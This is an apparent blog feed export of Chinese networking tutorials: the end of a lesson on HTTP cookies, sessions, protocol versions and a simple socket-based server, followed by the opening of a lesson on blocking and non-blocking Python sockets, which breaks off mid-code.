客户端存储的小数据<br><br>工作流程：<br><span class="hljs-bullet">1.</span> 用户登录成功<br><span class="hljs-bullet">2.</span> 服务器返回Set-Cookie头<br><span class="hljs-bullet">3.</span> 浏览器保存Cookie<br><span class="hljs-bullet">4.</span> 后续请求自动带上Cookie<br><span class="hljs-bullet">5.</span> 服务器识别用户<br></code></pre></td></tr></table></figure><h3 id="5-2-Cookie详解"><a href="#5-2-Cookie详解" class="headerlink" title="5.2 Cookie详解"></a>5.2 Cookie详解</h3><p><strong>设置Cookie</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">服务器响应：<br>HTTP/1.1 200 OK<br>Set-Cookie: <span class="hljs-attribute">session_id</span>=abc123; <span class="hljs-attribute">Path</span>=/; HttpOnly; Secure<br>Set-Cookie: <span class="hljs-attribute">user</span>=Alice; <span class="hljs-attribute">Max-Age</span>=86400<br><br>客户端后续请求：<br><span class="hljs-built_in">GET</span> /api<span class="hljs-built_in">/profile </span>HTTP/1.1<br>Cookie: <span class="hljs-attribute">session_id</span>=abc123; <span class="hljs-attribute">user</span>=Alice<br></code></pre></td></tr></table></figure><p><strong>Cookie属性</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Name=Value<br><span class="hljs-bullet">  -</span> Cookie的键值对<br><br>Expires=Wed, 21 Oct 2025 07:28:00 GMT<br><span class="hljs-bullet">  -</span> 过期时间（绝对时间）<br><br>Max-Age=3600<br><span class="hljs-bullet">  -</span> 有效期（秒数，相对时间）<br><br>Domain=.example.com<br><span class="hljs-bullet">  -</span> 生效域名<br><span class="hljs-bullet">  -</span> .example.com：所有子域名都生效<br><br>Path=/<br><span class="hljs-bullet">  -</span> 生效路径<br><span class="hljs-bullet">  -</span> /：所有路径<br><span class="hljs-bullet">  -</span> /api：只在/api路径下生效<br><br>Secure<br><span class="hljs-bullet">  -</span> 只在HTTPS下传输<br><br>HttpOnly<br><span class="hljs-bullet">  -</span> 禁止JavaScript访问<br><span class="hljs-bullet">  -</span> 防止XSS攻击<br><br>SameSite=Strict<br><span class="hljs-bullet">  -</span> Strict：完全禁止跨站发送<br><span class="hljs-bullet">  -</span> Lax：大部分情况禁止<br><span class="hljs-bullet">  -</span> None：允许跨站（需要Secure）<br><span class="hljs-bullet">  -</span> 防止CSRF攻击<br></code></pre></td></tr></table></figure><p><strong>Cookie示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 设置普通Cookie</span><br><span class="hljs-type">Set</span>-Cookie: user=Alice<br><br><span class="hljs-comment"># 设置过期Cookie（30天）</span><br><span class="hljs-type">Set</span>-Cookie: user=Alice; Max-Age=<span class="hljs-number">2592000</span><br><br><span class="hljs-comment"># 设置安全Cookie</span><br><span class="hljs-type">Set</span>-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict<br></code></pre></td></tr></table></figure><h3 id="5-3-Session详解"><a href="#5-3-Session详解" class="headerlink" title="5.3 Session详解"></a>5.3 Session详解</h3><p><strong>Session工作原理</strong>：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">流程：<br><br><span class="hljs-number">1.</span> 用户登录<br>   ─────────────&gt;<br>   POST /api/<span class="hljs-keyword">login</span><br>   &#123;&quot;username&quot;: &quot;Alice&quot;, &quot;password&quot;: &quot;***&quot;&#125;<br><br><span class="hljs-number">2.</span> 服务器验证成功<br>   - 创建<span class="hljs-keyword">Session</span>（服务器内存/数据库）<br>   - <span class="hljs-keyword">Session</span> ID: abc123<br>   - <span class="hljs-keyword">Session</span>数据: &#123;user_id: <span class="hljs-number">1</span>, username: &quot;Alice&quot;&#125;<br><br><span class="hljs-number">3.</span> 返回<span class="hljs-keyword">Session</span> ID<br>   &lt;─────────────<br>   <span class="hljs-keyword">Set</span>-Cookie: session_id=abc123; HttpOnly<br><br><span class="hljs-number">4.</span> 后续请求带上Cookie<br>   ─────────────&gt;<br>   <span class="hljs-keyword">GET</span> /api/profile<br>   Cookie: session_id=abc123<br><br><span class="hljs-number">5.</span> 服务器查找<span class="hljs-keyword">Session</span><br>   - 根据session_id查找<span class="hljs-keyword">Session</span>数据<br>   - 获取用户信息<br>   - 返回用户资料<br></code></pre></td></tr></table></figure><p><strong>Cookie vs Session</strong>：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌────────────┬────────────────┬────────────────┐<br>│   特性     │     Cookie     │     <span class="hljs-keyword">Session</span>    │<br>├────────────┼────────────────┼────────────────┤<br>│  存储位置  │   客户端       │   服务器       │<br>│  安全性    │   较低         │   较高         │<br>│  容量限制  │   <span class="hljs-number">4</span>KB          │   无限制       │<br>│  性能      │   无压力       │   占用内存     │<br>│  生命周期  │   可持久化     │   关闭浏览器失效│<br>└────────────┴────────────────┴────────────────┘<br><br>实际应用：<br>Cookie存储<span class="hljs-keyword">Session</span> ID<br><span class="hljs-keyword">Session</span>存储用户数据<br></code></pre></td></tr></table></figure><hr><h2 id="6-HTTP版本演进"><a href="#6-HTTP版本演进" class="headerlink" title="6. HTTP版本演进"></a>6. HTTP版本演进</h2><h3 id="6-1-HTTP-1-0"><a href="#6-1-HTTP-1-0" class="headerlink" title="6.1 HTTP&#x2F;1.0"></a>6.1 HTTP&#x2F;1.0</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">特点：<br><span class="hljs-bullet">- </span>每个请求都要建立新的TCP连接<br><span class="hljs-bullet">- </span>请求完成后立即关闭连接<br><br>问题：<br><span class="hljs-bullet">- </span>性能差（TCP三次握手开销）<br><span class="hljs-bullet">- </span>无法复用连接<br><br>示例：<br>客户端 → 服务器：建立连接<br>客户端 → 服务器：GET /page1.html<br>服务器 → 客户端：返回page1.html<br>断开连接<br><br>客户端 → 服务器：建立连接<br>客户端 → 服务器：GET /page2.html<br>服务器 → 客户端：返回page2.html<br>断开连接<br></code></pre></td></tr></table></figure><h3 id="6-2-HTTP-1-1"><a href="#6-2-HTTP-1-1" class="headerlink" title="6.2 HTTP&#x2F;1.1"></a>6.2 HTTP&#x2F;1.1</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">改进：<br>✅ 持久连接（Connection: keep-alive）<br>✅ 管道化（Pipelining）<br>✅ 分块传输（Chunked Transfer）<br>✅ 缓存控制增强<br>✅ Host头部（支持虚拟主机）<br><br>持久连接：<br>客户端 → 服务器：建立连接<br>客户端 → 服务器：GET <span class="hljs-string">/page1.html</span><br>服务器 → 客户端：返回page1.html<br>客户端 → 服务器：GET <span class="hljs-string">/page2.html</span><br>服务器 → 客户端：返回page2.html<br><span class="hljs-string">...</span> 保持连接 <span class="hljs-string">...</span><br><br>问题：<br>- 队头阻塞（Head-of-Line Blocking）<br>- 一个请求慢会阻塞后续请求<br></code></pre></td></tr></table></figure><h3 id="6-3-HTTP-2"><a href="#6-3-HTTP-2" class="headerlink" title="6.3 HTTP&#x2F;2"></a>6.3 HTTP&#x2F;2</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">改进：<br>✅ 二进制协议（不再是文本）<br>✅ 多路复用（Multiplexing）<br>✅ 头部压缩（HPACK）<br>✅ 服务器推送（Server Push）<br>✅ 流优先级<br><br>多路复用：<br>一个TCP连接，多个请求并行<br><br>┌─────────────────────────┐<br>│      TCP连接             │<br>├─────────────────────────┤<br>│ Stream 1: <span class="hljs-built_in">GET</span> /page1    │<br>│ Stream 2: <span class="hljs-built_in">GET</span> /style.css│<br>│ Stream 3: <span class="hljs-built_in">GET</span> /script.js│<br>│ Stream 4: <span class="hljs-built_in">GET</span> /image.jpg│<br>└─────────────────────────┘<br><br>优点：<br>- 解决队头阻塞<br>- 减少延迟<br>- 提高性能<br></code></pre></td></tr></table></figure><h3 id="6-4-HTTP-3"><a href="#6-4-HTTP-3" class="headerlink" title="6.4 HTTP&#x2F;3"></a>6.4 HTTP&#x2F;3</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">改进：<br>✅ 基于QUIC（UDP）<br>✅ 更快的连接建立<br>✅ 更好的拥塞控制<br>✅ 连接迁移（IP变化不断线）<br><br>为什么用UDP？<br><span class="hljs-bullet">- </span>TCP队头阻塞无法彻底解决<br><span class="hljs-bullet">- </span>UDP更灵活<br><span class="hljs-bullet">- </span>QUIC在应用层实现可靠传输<br><br>对比：<br>HTTP/1.1：文本 + TCP<br>HTTP/2：二进制 + TCP<br>HTTP/3：二进制 + QUIC(UDP)<br></code></pre></td></tr></table></figure><h3 id="6-5-版本对比"><a href="#6-5-版本对比" class="headerlink" title="6.5 版本对比"></a>6.5 版本对比</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌────────────┬──────────┬──────────┬──────────┐<br>│   特性     │ HTTP<span class="hljs-symbol">/1.1</span> │  HTTP<span class="hljs-symbol">/2</span>  │  HTTP<span class="hljs-symbol">/3</span>  │<br>├────────────┼──────────┼──────────┼──────────┤<br>│  协议      │   文本   │  二进制  │  二进制  │<br>│  传输层    │   TCP    │   TCP    │  QUIC    │<br>│  多路复用  │    ❌    │    ✅    │    ✅    │<br>│  头部压缩  │    ❌    │    ✅    │    ✅    │<br>│  服务器推送│    ❌    │    ✅    │    ✅    │<br>│  连接建立  │   慢     │   中等   │   快     │<br>└────────────┴──────────┴──────────┴──────────┘<br></code></pre></td></tr></table></figure><hr><h2 id="7-实战项目：简单HTTP服务器"><a href="#7-实战项目：简单HTTP服务器" class="headerlink" title="7. 实战项目：简单HTTP服务器"></a>7. 实战项目：简单HTTP服务器</h2><h3 id="7-1-项目需求"><a href="#7-1-项目需求" class="headerlink" title="7.1 项目需求"></a>7.1 项目需求</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">功能需求：<br><span class="hljs-bullet">1.</span> 支持GET/POST请求<br><span class="hljs-bullet">2.</span> 解析HTTP请求<br><span class="hljs-bullet">3.</span> 返回HTTP响应<br><span class="hljs-bullet">4.</span> 支持静态文件服务<br><span class="hljs-bullet">5.</span> 支持JSON API<br><span class="hljs-bullet">6.</span> 日志记录<br><br>技术要求：<br><span class="hljs-bullet">-</span> 使用Socket实现<br><span class="hljs-bullet">-</span> 遵循HTTP/1.1协议<br><span class="hljs-bullet">-</span> 支持Content-Type识别<br><span class="hljs-bullet">-</span> 支持基本的错误处理<br></code></pre></td></tr></table></figure><h3 id="7-2-工具演示"><a href="#7-2-工具演示" class="headerlink" title="7.2 工具演示"></a>7.2 工具演示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 启动HTTP服务器</span><br>python day19_http_server.py --host 0.0.0.0 --port 8080<br><br><span class="hljs-comment"># 测试HTTP客户端</span><br>python day19_http_client.py --url http://127.0.0.1:8080/<br><br><span class="hljs-comment"># 浏览器访问</span><br>open http://127.0.0.1:8080/<br></code></pre></td></tr></table></figure><hr><h2 id="8-今日练习"><a href="#8-今日练习" class="headerlink" title="8. 今日练习"></a>8. 今日练习</h2><h3 id="练习1：手动构建HTTP请求"><a href="#练习1：手动构建HTTP请求" class="headerlink" title="练习1：手动构建HTTP请求"></a>练习1：手动构建HTTP请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用socket发送原始HTTP请求</span><br><span class="hljs-comment"># 1. 连接到www.baidu.com:80</span><br><span class="hljs-comment"># 2. 发送GET请求</span><br><span class="hljs-comment"># 3. 解析响应</span><br><span class="hljs-comment"># 4. 打印状态码和头部</span><br></code></pre></td></tr></table></figure><h3 id="练习2：实现HTTP客户端"><a href="#练习2：实现HTTP客户端" class="headerlink" title="练习2：实现HTTP客户端"></a>练习2：实现HTTP客户端</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 实现一个简单的HTTP客户端</span><br><span class="hljs-comment"># 支持：</span><br><span class="hljs-comment"># 1. GET请求</span><br><span class="hljs-comment"># 2. POST请求（JSON）</span><br><span class="hljs-comment"># 3. 自动处理重定向</span><br><span class="hljs-comment"># 4. Cookie管理</span><br></code></pre></td></tr></table></figure><h3 id="练习3：分析HTTP流量"><a href="#练习3：分析HTTP流量" class="headerlink" title="练习3：分析HTTP流量"></a>练习3：分析HTTP流量</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用Wireshark或tcpdump</span><br><span class="hljs-comment"># 1. 捕获HTTP流量</span><br><span class="hljs-comment"># 2. 分析请求和响应</span><br><span class="hljs-comment"># 3. 识别状态码和头部</span><br></code></pre></td></tr></table></figure><h3 id="练习4：扩展HTTP服务器"><a href="#练习4：扩展HTTP服务器" class="headerlink" title="练习4：扩展HTTP服务器"></a>练习4：扩展HTTP服务器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 为HTTP服务器添加功能：</span><br><span class="hljs-comment"># 1. 支持PUT/DELETE方法</span><br><span class="hljs-comment"># 2. Session管理</span><br><span class="hljs-comment"># 3. 文件上传</span><br><span class="hljs-comment"># 4. 访问控制（Basic Auth）</span><br></code></pre></td></tr></table></figure><hr><h2 id="9-常见问题"><a href="#9-常见问题" class="headerlink" title="9. 常见问题"></a>9. 常见问题</h2><p><strong>Q1：GET和POST的本质区别是什么？</strong></p><p>A：</p><ul><li>语义：GET用于获取，POST用于提交</li><li>参数：GET在URL，POST在请求体</li><li>幂等性：GET幂等，POST不幂等</li><li>缓存：GET可缓存，POST不可</li><li>安全性：GET参数可见，POST相对隐藏</li></ul><p><strong>Q2：为什么有状态码304？</strong></p><p>A：</p><ul><li>节省带宽</li><li>利用浏览器缓存</li><li>服务器返回”资源未修改”</li><li>浏览器使用本地缓存</li></ul><p><strong>Q3：Cookie和Session哪个更安全？</strong></p><p>A：</p><ul><li>Session更安全（数据在服务器）</li><li>Cookie易被窃取和篡改</li><li>实际使用：Cookie存Session ID</li></ul><p><strong>Q4：HTTP&#x2F;2比HTTP&#x2F;1.1快多少？</strong></p><p>A：</p><ul><li>理论上：30%-50%</li><li>实际：取决于网络和资源数量</li><li>资源越多，优势越明显</li></ul><p><strong>Q5：什么时候用POST，什么时候用PUT？</strong></p><p>A：</p><ul><li>POST：创建新资源（ID由服务器生成）</li><li>PUT：更新已存在资源（ID已知）</li><li>POST非幂等，PUT幂等</li></ul><hr><h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10. 总结"></a>10. 总结</h2><p>今天我们学习了：</p><h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><ol><li><p><strong>HTTP基础</strong>：</p><ul><li>应用层协议</li><li>无状态、明文传输</li><li>请求-响应模式</li></ul></li><li><p><strong>请求格式</strong>：</p><ul><li>请求行（方法 URI 版本）</li><li>请求头</li><li>空行</li><li>请求体（可选）</li></ul></li><li><p><strong>响应格式</strong>：</p><ul><li>状态行（版本 状态码 描述）</li><li>响应头</li><li>空行</li><li>响应体</li></ul></li><li><p><strong>HTTP方法</strong>：</p><ul><li>GET：查询</li><li>POST：创建</li><li>PUT：更新</li><li>DELETE：删除</li></ul></li><li><p><strong>状态码</strong>：</p><ul><li>2xx：成功</li><li>3xx：重定向</li><li>4xx：客户端错误</li><li>5xx：服务器错误</li></ul></li><li><p><strong>Cookie&#x2F;Session</strong>：</p><ul><li>Cookie：客户端存储</li><li>Session：服务器存储</li><li>配合使用</li></ul></li><li><p><strong>版本演进</strong>：</p><ul><li>HTTP&#x2F;1.1：持久连接</li><li>HTTP&#x2F;2：多路复用</li><li>HTTP&#x2F;3：QUIC</li></ul></li></ol><h3 id="重点回顾"><a href="#重点回顾" class="headerlink" title="重点回顾"></a>重点回顾</h3><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">HTTP请求 </span>=<span class="hljs-string"> 请求行 + 请求头 + 空行 + 请求体</span><br><span class="hljs-string">HTTP响应 = 状态行 + 响应头 + 空行 + 响应体</span><br><span class="hljs-string"></span><br><span class="hljs-string">常用状态码：</span><br><span class="hljs-string">200 OK</span><br><span class="hljs-string">301 永久重定向</span><br><span class="hljs-string">302 临时重定向</span><br><span class="hljs-string">304 未修改</span><br><span class="hljs-string">400 请求错误</span><br><span class="hljs-string">401 未认证</span><br><span class="hljs-string">403 禁止</span><br><span class="hljs-string">404 未找到</span><br><span class="hljs-string">500 服务器错误</span><br><span class="hljs-string"></span><br><span class="hljs-string">HTTP/2核心：</span><br><span class="hljs-string">多路复用 + 头部压缩 + 二进制协议</span><br></code></pre></td></tr></table></figure><h3 id="明天预告"><a href="#明天预告" class="headerlink" title="明天预告"></a>明天预告</h3><p><strong>第20天：HTTPS和安全</strong></p><p>内容预览：</p><ul><li>TLS&#x2F;SSL协议</li><li>数字证书</li><li>对称加密和非对称加密</li><li>HTTPS握手过程</li><li>证书验证</li><li>常见攻击和防御</li></ul><hr><p><strong>继续加油！</strong> 🚀</p><p>今天我们学习了HTTP协议的基础知识，这是Web开发的核心。理解HTTP协议对于开发Web应用、调试网络问题都至关重要。明天我们将学习HTTPS，了解如何保护HTTP通信的安全！</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>18天：Socket编程进阶</title>
    <link href="/2025/11/10/18%E5%A4%A9%EF%BC%9ASocket%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6/"/>
    <url>/2025/11/10/18%E5%A4%A9%EF%BC%9ASocket%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="第18天：Socket编程进阶"><a href="#第18天：Socket编程进阶" class="headerlink" title="第18天：Socket编程进阶"></a>第18天：Socket编程进阶</h1><h2 id="今日目标"><a href="#今日目标" class="headerlink" title="今日目标"></a>今日目标</h2><ul><li>理解阻塞和非阻塞Socket</li><li>掌握IO多路复用技术（select&#x2F;poll&#x2F;epoll）</li><li>学习Socket选项配置</li><li>了解高性能服务器设计模式</li><li>实现多客户端并发服务器</li><li>构建实战项目：多人聊天室</li></ul><hr><h2 id="1-阻塞与非阻塞Socket"><a href="#1-阻塞与非阻塞Socket" class="headerlink" title="1. 阻塞与非阻塞Socket"></a>1. 阻塞与非阻塞Socket</h2><h3 id="1-1-什么是阻塞？"><a href="#1-1-什么是阻塞？" class="headerlink" title="1.1 什么是阻塞？"></a>1.1 什么是阻塞？</h3><p><strong>阻塞（Blocking）</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">生活类比：<br>你去银行取钱（阻塞模式）：<br><span class="hljs-number">1.</span> 排队等待<br><span class="hljs-number">2.</span> 叫到你的号之前，你只能等待<br><span class="hljs-number">3.</span> 什么也做不了<br><span class="hljs-number">4.</span> 叫到号了才能办理业务<br><br>阻塞Socket：<br>sock.recv(<span class="hljs-number">1024</span>)<br>↓<br>如果没有数据，就一直等待<br>什么也做不了<br>直到有数据到达<br></code></pre></td></tr></table></figure><p><strong>阻塞Socket示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-comment"># 默认是阻塞模式</span><br>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>sock.connect((<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>, <span class="hljs-number">80</span>))<br><br><span class="hljs-comment"># 发送请求</span><br>sock.send(<span class="hljs-string">b&#x27;GET / HTTP/1.1\r\nHost: www.baidu.com\r\n\r\n&#x27;</span>)<br><br><span class="hljs-comment"># 阻塞在这里，直到收到数据</span><br>data = sock.recv(<span class="hljs-number">1024</span>)  <span class="hljs-comment"># ⏸️ 阻塞等待</span><br><span class="hljs-built_in">print</span>(data)<br><br>sock.close()<br></code></pre></td></tr></table></figure><p><strong>阻塞的问题</strong>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css">单线程服务器：<br><br>while True:<br>    client_sock, addr = server_sock.<span class="hljs-built_in">accept</span>()  # 阻塞<span class="hljs-number">1</span><br>    data = client_sock.<span class="hljs-built_in">recv</span>(<span class="hljs-number">1024</span>)             # 阻塞<span class="hljs-number">2</span><br>    client_sock.<span class="hljs-built_in">send</span>(response)<br>    client_sock.<span class="hljs-built_in">close</span>()<br><br>问题：<br>- <span class="hljs-built_in">accept</span>()阻塞 → 只能等待一个客户端<br>- <span class="hljs-built_in">recv</span>()阻塞 → 处理一个客户端时，其他客户端无法连接<br>- 无法同时服务多个客户端 ❌<br></code></pre></td></tr></table></figure><h3 id="1-2-非阻塞Socket"><a href="#1-2-非阻塞Socket" class="headerlink" title="1.2 非阻塞Socket"></a>1.2 非阻塞Socket</h3><p><strong>非阻塞（Non-blocking）</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">生活类比：<br>你去银行取钱（非阻塞模式）：<br><span class="hljs-number">1.</span> 取号<br><span class="hljs-number">2.</span> 没叫到号，去旁边玩手机<br><span class="hljs-number">3.</span> 每隔几分钟看一眼叫号屏幕<br><span class="hljs-number">4.</span> 叫到号了再去办理<br><br>非阻塞Socket：<br>sock.setblocking(<span class="hljs-literal">False</span>)<br><span class="hljs-keyword">try</span>:<br>    data = sock.recv(<span class="hljs-number">1024</span>)<br><span class="hljs-keyword">except</span> BlockingIOError:<br>    <span class="hljs-comment"># 没有数据，立即返回</span><br>    <span class="hljs-comment"># 可以做其他事情</span><br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><strong>非阻塞Socket示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> errno<br><br>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-comment"># 设置为非阻塞</span><br>sock.setblocking(<span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">try</span>:<br>    sock.connect((<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>, <span class="hljs-number">80</span>))<br><span class="hljs-keyword">except</span> BlockingIOError:<br>    <span class="hljs-comment"># 连接正在进行中</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># 发送数据</span><br><span 